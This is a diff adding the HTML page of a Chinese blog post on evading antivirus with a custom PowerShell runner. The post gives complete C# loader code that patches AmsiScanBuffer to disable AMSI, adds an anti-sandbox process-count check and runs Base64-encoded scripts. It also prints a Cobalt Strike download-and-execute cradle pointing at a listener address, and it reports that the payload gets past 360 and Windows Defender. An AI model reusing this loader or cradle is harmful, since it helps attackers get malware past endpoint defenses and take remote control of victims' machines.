@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言分析powershell通过查看powershell程序的模块调用，发现有一个名为System.Management.Automation.ni.dll，这个Dll包含PowerShell 运行时和所有在 PowerShell 环境中运行的命令 System.Management.Automation.ni.dll 是预编译版本的 System.Management.Automation.dl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chensicha‘s blogs">
+<meta property="og:url" content="http://example.com/2024/04/29/Powershell%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="Chensicha‘s blogs">
+<meta property="og:description" content="前言分析powershell通过查看powershell程序的模块调用，发现有一个名为System.Management.Automation.ni.dll，这个Dll包含PowerShell 运行时和所有在 PowerShell 环境中运行的命令 System.Management.Automation.ni.dll 是预编译版本的 System.Management.Automation.dl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/04/29/Powershell%E5%85%8D%E6%9D%80/Powershell%E5%85%8D%E6%9D%80/image-20230719000833203.png">
+<meta property="og:image" content="http://example.com/Powershell%E5%85%8D%E6%9D%80/image-20230719001757139.png">
+<meta property="og:image" content="http://example.com/2024/04/29/Powershell%E5%85%8D%E6%9D%80/Powershell%E5%85%8D%E6%9D%80/image-20230719101836803.png">
+<meta property="og:image" content="http://example.com/Powershell%E5%85%8D%E6%9D%80/image-20230719104136698.png">
+<meta property="og:image" content="http://example.com/Powershell%E5%85%8D%E6%9D%80/image-20230719111801493.png">
+<meta property="og:image" content="http://example.com/Powershell%E5%85%8D%E6%9D%80/image-20230719111453899.png">
+<meta property="article:published_time" content="2024-04-29T07:43:25.465Z">
+<meta property="article:modified_time" content="2023-08-26T09:09:52.000Z">
+<meta property="article:author" content="Xiao Ni">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/04/29/Powershell%E5%85%8D%E6%9D%80/Powershell%E5%85%8D%E6%9D%80/image-20230719000833203.png">
+
+<link rel="canonical" href="http://example.com/2024/04/29/Powershell%E5%85%8D%E6%9D%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Chensicha‘s blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chensicha‘s blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/Powershell%E5%85%8D%E6%9D%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+      <meta itemprop="name" content="Xiao Ni">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chensicha‘s blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="分析powershell"><a href="#分析powershell" class="headerlink" title="分析powershell"></a>分析powershell</h1><p>通过查看powershell程序的模块调用，发现有一个名为<code>System.Management.Automation.ni.dll</code>，这个Dll包含PowerShell 运行时和所有在 PowerShell 环境中运行的命令</p>
+<p><code>System.Management.Automation.ni.dll</code> 是预编译版本的 <code>System.Management.Automation.dll</code>，这样 PowerShell 可以更快地加载和运行</p>
+<p>若想执行 PowerShell 命令或脚本的 C# 程序，都需要引用 <code>System.Management.Automation.dll</code></p>
+<img src="Powershell免杀/image-20230719000833203.png" alt="image-20230719000833203" style="zoom:80%;" />
+
+
+
+<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>创建一个C#的<code>.Net Framework</code>项目，添加引用，点击浏览找到<code>System.Management.Automation.dll</code>其所在路径并勾选上</p>
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719001757139.png" alt="image-20230719001757139"></p>
+<p>下述代码是一个完整的PowerShell脚本执行环境，它支持接收Base64编码的PowerShell脚本作为参数，解码并执行脚本，同时如果参数中包含”-s”，那么还会执行bypass AMSI的操作。其中AMSI是Windows中用于防止恶意脚本执行的安全机制</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> MyPowershell</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用DllImport属性导入kernel32.dll中的GetProcAddress函数，用于获取指定模块的函数或变量的地址。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetProcAddress</span><span class="params">(IntPtr hModule, string procName)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的LoadLibrary函数，用于加载指定的动态链接库，并返回库的句柄。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">LoadLibrary</span><span class="params">(string name)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的VirtualProtect函数，用于改变指定内存区域的保护属性。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> <span class="type">bool</span> <span class="title">VirtualProtect</span><span class="params">(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用于将byte数组中的数据复制到指定的内存地址中。</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> <span class="type">void</span> <span class="title">copy</span><span class="params">(Byte[] Patch, IntPtr Address)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Marshal.<span class="built_in">Copy</span>(Patch, <span class="number">0</span>, Address, <span class="number">6</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此方法通过修改AmsiScanBuffer函数来bypass AMSI检测。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">chaching</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 加载amsi.dll</span></span><br><span class="line">            IntPtr Library = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;a&quot;</span> + <span class="string">&quot;m&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;i&quot;</span> + <span class="string">&quot;.dll&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AmsiScanBuffer函数的地址</span></span><br><span class="line">            IntPtr Address = <span class="built_in">GetProcAddress</span>(Library, <span class="string">&quot;Amsi&quot;</span> + <span class="string">&quot;Scan&quot;</span> + <span class="string">&quot;Buffer&quot;</span>);</span><br><span class="line">            uint p;</span><br><span class="line">            <span class="comment">// 修改AmsiScanBuffer函数的内存保护属性</span></span><br><span class="line">            <span class="built_in">VirtualProtect</span>(Address, (UIntPtr)<span class="number">5</span>, <span class="number">0x40</span>, out p);</span><br><span class="line">            <span class="comment">// 准备新的函数字节码</span></span><br><span class="line">            Byte[] Patch = &#123; <span class="number">0xB8</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0xC3</span> &#125;;</span><br><span class="line">            <span class="comment">// 将新的函数字节码复制到AmsiScanBuffer函数的地址</span></span><br><span class="line">            <span class="built_in">copy</span>(Patch, Address);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;Patch Applied&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 如果命令行参数为空，结束程序运行</span></span><br><span class="line">            <span class="keyword">if</span> (args.Length == <span class="number">0</span>)</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">1</span>);</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 判断系统的进程数是否小于40，如果小于40则退出程序(用来反defender的沙箱)</span></span><br><span class="line">            <span class="keyword">if</span> (Process.<span class="built_in">GetProcesses</span>().Length &lt; <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;The number of processes in the system is less than 40. Exiting the program.&quot;</span>);</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            List&lt;string&gt; argsList = <span class="keyword">new</span> <span class="built_in">List</span>&lt;string&gt;(args);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果命令行参数中包含“-s”，则执行bypass amsi的操作</span></span><br><span class="line">            <span class="keyword">if</span> (argsList.<span class="built_in">Contains</span>(<span class="string">&quot;-s&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">chaching</span>();</span><br><span class="line">                argsList.<span class="built_in">Remove</span>(<span class="string">&quot;-s&quot;</span>); <span class="comment">//从参数数组中移除&quot;-s&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 对传入的Base64编码的字符串进行解码</span></span><br><span class="line">            string temp = <span class="built_in">Base64Decode</span>(argsList[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">// 运行解码后的PowerShell脚本，并将执行结果输出到控制台</span></span><br><span class="line">            string s = <span class="built_in">RunScript</span>(temp);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(s);</span><br><span class="line">            Console.<span class="built_in">ReadKey</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64解码函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> string <span class="title">Base64Decode</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> System.Text.Encoding.Default.<span class="built_in">GetString</span>(System.Convert.<span class="built_in">FromBase64String</span>(s));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行PowerShell脚本并返回执行结果的函数</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> string <span class="title">RunScript</span><span class="params">(string script)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 创建并打开一个运行空间，用于运行PowerShell命令</span></span><br><span class="line">            Runspace MyRunspace = RunspaceFactory.<span class="built_in">CreateRunspace</span>();</span><br><span class="line">            MyRunspace.<span class="built_in">Open</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在运行空间中创建一个管道，用于存放待执行的PowerShell命令</span></span><br><span class="line">            Pipeline MyPipeline = MyRunspace.<span class="built_in">CreatePipeline</span>();</span><br><span class="line">            <span class="comment">// 在管道中添加PowerShell命令</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">AddScript</span>(script);</span><br><span class="line">            <span class="comment">// 在管道中添加输出命令，使得PowerShell命令的执行结果能被程序获取</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">Add</span>(<span class="string">&quot;Out-String&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用管道中的PowerShell命令，并获取执行结果</span></span><br><span class="line">            Collection&lt;PSObject&gt; outputs = MyPipeline.<span class="built_in">Invoke</span>();</span><br><span class="line">            <span class="comment">// 关闭运行空间</span></span><br><span class="line">            MyRunspace.<span class="built_in">Close</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将执行结果转换为字符串</span></span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            foreach (PSObject pobject in outputs)</span><br><span class="line">            &#123;</span><br><span class="line">                sb.<span class="built_in">AppendLine</span>(pobject.<span class="built_in">ToString</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.<span class="built_in">ToString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​		</p>
+<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><h2 id="360核晶环境"><a href="#360核晶环境" class="headerlink" title="360核晶环境"></a>360核晶环境</h2><p>360静态查杀没有报毒</p>
+<img src="Powershell免杀/image-20230719101836803.png" alt="image-20230719101836803" style="zoom:67%;" />	
+
+
+
+<p>使用CobaltStrike生成Powershell命令, 我们只需截取以下部分作为payload即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.47.155:80/a&#x27;))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将payload进行base64加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>
+
+
+
+<p>打开cmd或powershell执行如下命令，cs上线成功，没有被核晶拦截</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mypowershell.exe SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719104136698.png" alt="image-20230719104136698"></p>
+<h2 id="Defender环境"><a href="#Defender环境" class="headerlink" title="Defender环境"></a>Defender环境</h2><p>在WindowsDefender环境下按照之前的操作执行会被amsi拦截（360是没有集成amsi的）</p>
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111801493.png" alt="image-20230719111801493"></p>
+<p>因此需加上-s参数来绕过amsi，这样CS就能正常上线了</p>
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111453899.png" alt="image-20230719111453899"></p>
+<p>​		</p>
+<p>​		</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/29/mimikatz%E5%85%8D%E6%9D%80/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90powershell"><span class="nav-number">2.</span> <span class="nav-text">分析powershell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-number">4.</span> <span class="nav-text">运行测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#360%E6%A0%B8%E6%99%B6%E7%8E%AF%E5%A2%83"><span class="nav-number">4.1.</span> <span class="nav-text">360核晶环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Defender%E7%8E%AF%E5%A2%83"><span class="nav-number">4.2.</span> <span class="nav-text">Defender环境</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xiao Ni"
+      src="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+  <p class="site-author-name" itemprop="name">Xiao Ni</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiao Ni</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+#running-time
+
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+        var pvcountOffset = 80000;  // 初始化首次数据
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int); // 停止检测
+            }
+        }
+    });
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
